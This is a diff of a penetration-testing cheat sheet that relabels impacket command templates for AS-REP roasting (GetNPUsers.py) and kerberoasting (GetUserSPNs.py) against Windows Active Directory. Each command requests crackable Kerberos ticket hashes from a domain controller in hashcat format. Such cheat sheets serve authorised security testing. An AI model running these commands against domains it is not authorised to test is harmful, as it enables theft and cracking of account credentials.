@@ -2,19 +2,19 @@
 
 % impacket, windows, kerberos, 88
 
-## GetNPUsers without password to get TGT (ASREPRoast)
+## GetNPUsers without password to get TGT (ASREPRoasting)
 #plateform/linux #target/remote #cat/ATTACK/EXPLOIT 
 ```
 GetNPUsers.py <domain>/<user> -no-pass -request -format hashcat
 ```
 
-## GetNPUsers - attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’
+## GetNPUsers - attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ (ASREPRoasting)
 #plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
 ```
 GetNPUsers.py -dc-ip <dc_ip> <domain>/ -usersfile <users_file> -format hashcat
 ```
 
-## GetUSERSPN - find Service Principal Names that are associated with a normal user account
+## GetUSERSPN - find Service Principal Names that are associated with a normal user account (kerberoasting)
 #plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
 ```
 GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>
